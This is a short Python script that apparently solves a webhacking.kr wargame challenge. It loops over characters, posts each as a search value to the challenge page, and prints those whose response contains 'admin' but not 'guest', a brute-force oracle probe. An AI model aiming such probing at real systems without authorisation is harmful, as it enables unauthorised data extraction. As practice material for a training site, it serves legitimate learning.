from requests import *
s=session()
key='admin'
key2='guest'
for i in range(21,128):
    url='https://webhacking.kr/challenge/web-33/index.php'
    i=chr(i)
    data={'search':f'{i}'}
    response=s.post(url=url,data=data)
    if response.text.find(key) != -1 and response.text.find(key2) == -1:
        print(i,end='')